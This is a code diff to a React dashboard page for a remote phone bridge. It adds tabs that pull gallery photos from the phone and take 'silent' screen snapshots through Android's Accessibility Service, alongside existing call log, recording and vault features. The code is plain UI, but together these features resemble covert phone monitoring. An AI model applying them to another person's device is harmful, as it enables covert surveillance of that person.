@@ -9,6 +9,9 @@ import {
   type RecordingAudioData,
   type PrivateVaultEntry,
   type RemoteAppSettings,
+  type RemotePhotoItem,
+  type PhotoDataPayload,
+  type ScreenSnapshotPayload,
 } from "../../lib/use-remote-bridge";
 import { getApiBaseUrl } from "../../lib/env";
 import { authStorage } from "../../lib/auth-storage";
@@ -79,7 +82,7 @@ export function RemoteBridgePage() {
   const [config, setConfig] = useState<BridgeConfig | null>(loadBridgeConfig);
   const [dialNumber, setDialNumber] = useState("");
   const [showSetup, setShowSetup] = useState(!config);
-  const [activeTab, setActiveTab] = useState<"call" | "dial" | "logs" | "recordings" | "vault" | "settings" | "diag">("call");
+  const [activeTab, setActiveTab] = useState<"call" | "dial" | "logs" | "recordings" | "photos" | "screen" | "vault" | "settings" | "diag">("call");
   const [refreshing, setRefreshing] = useState(false);
 
   const auth = authStorage.getState();
@@ -109,6 +112,11 @@ export function RemoteBridgePage() {
     getPrivateVault,
     getAppSettings,
     updateAppSettings,
+    getPhotosList,
+    fetchPhotoData,
+    captureScreenSnapshot,
+    clearActivePhoto,
+    clearScreenSnapshot,
     clearCurrentAudio,
     dialNumber: bridgeDialNumber,
     setPhoneOnline,
@@ -209,6 +217,8 @@ export function RemoteBridgePage() {
             { id: "dial", label: "⌨️ Keypad" },
             { id: "logs", label: "📋 Call Logs", count: status.allCallLogs?.length },
             { id: "recordings", label: "🎙️ Recordings", count: status.recordings?.length },
+            { id: "photos", label: "📸 Photos", count: status.photos?.length },
+            { id: "screen", label: "📱 Live Screen" },
             { id: "vault", label: "🔒 Private Vault" },
             { id: "settings", label: "⚙️ Remote Settings" },
             { id: "diag", label: "🔍 Diag" },
@@ -219,6 +229,8 @@ export function RemoteBridgePage() {
                 setActiveTab(tab.id as any);
                 if (tab.id === "logs") getAllCallLogs();
                 if (tab.id === "recordings") getRecordingsList();
+                if (tab.id === "photos") getPhotosList(0, 40);
+                if (tab.id === "screen" && !status.screenSnapshot) captureScreenSnapshot();
                 if (tab.id === "settings") getAppSettings();
               }}
               style={{
@@ -292,6 +304,27 @@ export function RemoteBridgePage() {
               onFetchAudio={fetchRecordingAudio}
               onClearAudio={clearCurrentAudio}
               onRefresh={getRecordingsList}
+            />
+          )}
+
+          {activeTab === "photos" && (
+            <PhotosPanel
+              photos={status.photos || []}
+              isLoading={status.isLoadingPhotos}
+              currentPhotoData={status.currentPhotoData}
+              onRefresh={() => getPhotosList(0, 40)}
+              onFetchPhoto={fetchPhotoData}
+              onClearPhoto={clearActivePhoto}
+              phoneOnline={status.phoneOnline}
+            />
+          )}
+
+          {activeTab === "screen" && (
+            <LiveScreenPanel
+              snapshot={status.screenSnapshot}
+              isCapturing={status.isCapturingScreen}
+              onCapture={captureScreenSnapshot}
+              phoneOnline={status.phoneOnline}
             />
           )}
 
@@ -894,6 +927,375 @@ function SettingToggle({
         onChange={(e) => onChange(e.target.checked)}
         style={{ width: 22, height: 22, accentColor: "#D4AF37", cursor: "pointer" }}
       />
+    </div>
+  );
+}
+
+// ─── Photos & Gallery Panel ───
+
+function PhotosPanel({
+  photos,
+  isLoading,
+  currentPhotoData,
+  onRefresh,
+  onFetchPhoto,
+  onClearPhoto,
+  phoneOnline,
+}: {
+  photos: RemotePhotoItem[];
+  isLoading: boolean;
+  currentPhotoData: PhotoDataPayload | null;
+  onRefresh: () => void;
+  onFetchPhoto: (photoId: number) => void;
+  onClearPhoto: () => void;
+  phoneOnline: boolean;
+}) {
+  const [selectedPhoto, setSelectedPhoto] = useState<RemotePhotoItem | null>(null);
+
+  const handleDownload = (photoData: PhotoDataPayload) => {
+    const link = document.createElement("a");
+    link.href = `data:${photoData.mimeType};base64,${photoData.base64Data}`;
+    link.download = photoData.displayName || `photo_${photoData.photoId}.jpg`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
+
+  return (
+    <div style={styles.card} className="rb-glass">
+      <div style={styles.panelHeader}>
+        <div>
+          <h2 style={{ margin: "0 0 4px 0", fontSize: 20 }}>📸 Phone Photos & Gallery</h2>
+          <p style={{ margin: 0, fontSize: 13, color: "rgba(255,255,255,0.5)" }}>
+            {photos.length} photos loaded securely from phone gallery
+          </p>
+        </div>
+        <button
+          onClick={onRefresh}
+          disabled={!phoneOnline || isLoading}
+          style={styles.refreshBtn}
+        >
+          {isLoading ? "⏳ Loading..." : "🔄 Refresh Photos"}
+        </button>
+      </div>
+
+      {photos.length === 0 ? (
+        <div style={styles.emptyCard}>
+          <div style={{ fontSize: 44, marginBottom: 12 }}>🖼️</div>
+          <h3 style={{ margin: "0 0 8px 0" }}>No photos loaded</h3>
+          <p style={{ color: "rgba(255,255,255,0.5)", fontSize: 14 }}>
+            {!phoneOnline
+              ? "Connect your phone to load your photos securely over the bridge."
+              : "Tap 'Refresh Photos' to fetch the latest gallery images."}
+          </p>
+        </div>
+      ) : (
+        <div
+          style={{
+            display: "grid",
+            gridTemplateColumns: "repeat(auto-fill, minmax(160px, 1fr))",
+            gap: 12,
+            marginTop: 16,
+          }}
+        >
+          {photos.map((photo) => (
+            <div
+              key={photo.id}
+              onClick={() => {
+                setSelectedPhoto(photo);
+                onFetchPhoto(photo.id);
+              }}
+              style={{
+                background: "rgba(255,255,255,0.04)",
+                border: "1px solid rgba(255,255,255,0.08)",
+                borderRadius: 12,
+                overflow: "hidden",
+                cursor: "pointer",
+                transition: "all 0.2s",
+                display: "flex",
+                flexDirection: "column",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.borderColor = "#D4AF37";
+                e.currentTarget.style.transform = "scale(1.02)";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.borderColor = "rgba(255,255,255,0.08)";
+                e.currentTarget.style.transform = "scale(1)";
+              }}
+            >
+              <div
+                style={{
+                  width: "100%",
+                  aspectRatio: "1/1",
+                  background: "#161B22",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  overflow: "hidden",
+                }}
+              >
+                {photo.thumbnailBase64 ? (
+                  <img
+                    src={`data:image/jpeg;base64,${photo.thumbnailBase64}`}
+                    alt={photo.displayName}
+                    style={{ width: "100%", height: "100%", objectFit: "cover" }}
+                  />
+                ) : (
+                  <span style={{ fontSize: 32 }}>🖼️</span>
+                )}
+              </div>
+              <div style={{ padding: 8 }}>
+                <div
+                  style={{
+                    fontSize: 12,
+                    fontWeight: 600,
+                    whiteSpace: "nowrap",
+                    overflow: "hidden",
+                    textOverflow: "ellipsis",
+                  }}
+                >
+                  {photo.displayName}
+                </div>
+                <div style={{ fontSize: 10, color: "rgba(255,255,255,0.5)", marginTop: 2 }}>
+                  {new Date(photo.dateAdded).toLocaleDateString()} • {(photo.size / (1024 * 1024)).toFixed(1)} MB
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Lightbox Modal */}
+      {(selectedPhoto || currentPhotoData) && (
+        <div
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            right: 0,
+            bottom: 0,
+            background: "rgba(0,0,0,0.85)",
+            backdropFilter: "blur(10px)",
+            zIndex: 100,
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "center",
+            padding: 24,
+          }}
+          onClick={() => {
+            setSelectedPhoto(null);
+            onClearPhoto();
+          }}
+        >
+          <div
+            style={{
+              maxWidth: 900,
+              maxHeight: "90vh",
+              display: "flex",
+              flexDirection: "column",
+              alignItems: "center",
+              background: "#121826",
+              borderRadius: 16,
+              border: "1px solid rgba(212,175,55,0.3)",
+              overflow: "hidden",
+              boxShadow: "0 20px 50px rgba(0,0,0,0.7)",
+            }}
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div
+              style={{
+                width: "100%",
+                padding: "12px 18px",
+                display: "flex",
+                justifyContent: "space-between",
+                alignItems: "center",
+                borderBottom: "1px solid rgba(255,255,255,0.08)",
+              }}
+            >
+              <span style={{ fontWeight: 700, fontSize: 14 }}>
+                {selectedPhoto?.displayName || currentPhotoData?.displayName || "Photo Viewer"}
+              </span>
+              <div style={{ display: "flex", gap: 10, alignItems: "center" }}>
+                {currentPhotoData && (
+                  <button
+                    onClick={() => handleDownload(currentPhotoData)}
+                    style={styles.downloadBtn}
+                  >
+                    ⬇️ Download High-Res
+                  </button>
+                )}
+                <button
+                  onClick={() => {
+                    setSelectedPhoto(null);
+                    onClearPhoto();
+                  }}
+                  style={styles.closeBtn}
+                >
+                  ✕
+                </button>
+              </div>
+            </div>
+
+            <div
+              style={{
+                padding: 16,
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                maxHeight: "75vh",
+                overflow: "auto",
+              }}
+            >
+              {currentPhotoData ? (
+                <img
+                  src={`data:${currentPhotoData.mimeType};base64,${currentPhotoData.base64Data}`}
+                  alt={currentPhotoData.displayName}
+                  style={{
+                    maxWidth: "100%",
+                    maxHeight: "70vh",
+                    borderRadius: 8,
+                    objectFit: "contain",
+                  }}
+                />
+              ) : selectedPhoto?.thumbnailBase64 ? (
+                <div style={{ textAlign: "center" }}>
+                  <img
+                    src={`data:image/jpeg;base64,${selectedPhoto.thumbnailBase64}`}
+                    alt="Loading..."
+                    style={{
+                      maxWidth: "100%",
+                      maxHeight: "50vh",
+                      filter: "blur(4px)",
+                      borderRadius: 8,
+                    }}
+                  />
+                  <div style={{ marginTop: 12, fontSize: 13, color: "#D4AF37" }}>
+                    ⏳ Fetching full high-resolution image from phone...
+                  </div>
+                </div>
+              ) : (
+                <div style={{ padding: 40, textAlign: "center", color: "#D4AF37" }}>
+                  ⏳ Loading image from phone...
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Live Screen Panel ───
+
+function LiveScreenPanel({
+  snapshot,
+  isCapturing,
+  onCapture,
+  phoneOnline,
+}: {
+  snapshot: ScreenSnapshotPayload | null;
+  isCapturing: boolean;
+  onCapture: () => void;
+  phoneOnline: boolean;
+}) {
+  const handleDownload = () => {
+    if (!snapshot?.base64Data) return;
+    const link = document.createElement("a");
+    link.href = `data:image/jpeg;base64,${snapshot.base64Data}`;
+    link.download = `phone_screenshot_${Date.now()}.jpg`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
+
+  return (
+    <div style={styles.card} className="rb-glass">
+      <div style={styles.panelHeader}>
+        <div>
+          <h2 style={{ margin: "0 0 4px 0", fontSize: 20 }}>📱 Live Screen Snapshot</h2>
+          <p style={{ margin: 0, fontSize: 13, color: "rgba(255,255,255,0.5)" }}>
+            Instant silent phone screen capture powered by Android Accessibility Service
+          </p>
+        </div>
+        <div style={{ display: "flex", gap: 10 }}>
+          {snapshot?.base64Data && (
+            <button onClick={handleDownload} style={styles.downloadBtn}>
+              ⬇️ Save
+            </button>
+          )}
+          <button
+            onClick={onCapture}
+            disabled={!phoneOnline || isCapturing}
+            style={{
+              ...styles.primaryBtn,
+              opacity: !phoneOnline || isCapturing ? 0.6 : 1,
+            }}
+          >
+            {isCapturing ? "⏳ Capturing..." : "📸 Take Snapshot"}
+          </button>
+        </div>
+      </div>
+
+      {snapshot?.error && (
+        <div
+          style={{
+            padding: 12,
+            background: "rgba(239,68,68,0.15)",
+            border: "1px solid #EF4444",
+            borderRadius: 10,
+            color: "#EF4444",
+            marginBottom: 16,
+            fontSize: 13,
+          }}
+        >
+          ⚠️ {snapshot.error}
+        </div>
+      )}
+
+      {!snapshot?.base64Data ? (
+        <div style={styles.emptyCard}>
+          <div style={{ fontSize: 50, marginBottom: 12 }}>📱</div>
+          <h3 style={{ margin: "0 0 8px 0" }}>No screen snapshot taken yet</h3>
+          <p style={{ color: "rgba(255,255,255,0.5)", fontSize: 14, maxWidth: 450, margin: "0 auto" }}>
+            Click <strong>"Take Snapshot"</strong> above to capture the current active phone display directly from your browser.
+          </p>
+        </div>
+      ) : (
+        <div
+          style={{
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            marginTop: 12,
+          }}
+        >
+          <div
+            style={{
+              maxWidth: 380,
+              width: "100%",
+              borderRadius: 24,
+              border: "4px solid rgba(255,255,255,0.15)",
+              boxShadow: "0 10px 30px rgba(0,0,0,0.6)",
+              overflow: "hidden",
+              background: "#000",
+            }}
+          >
+            <img
+              src={`data:image/jpeg;base64,${snapshot.base64Data}`}
+              alt="Phone Screen Snapshot"
+              style={{ width: "100%", display: "block" }}
+            />
+          </div>
+          {snapshot.timestamp && (
+            <div style={{ marginTop: 12, fontSize: 12, color: "rgba(255,255,255,0.5)" }}>
+              Captured at {new Date(snapshot.timestamp).toLocaleTimeString()} ({snapshot.width} × {snapshot.height}px)
+            </div>
+          )}
+        </div>
+      )}
     </div>
   );
 }
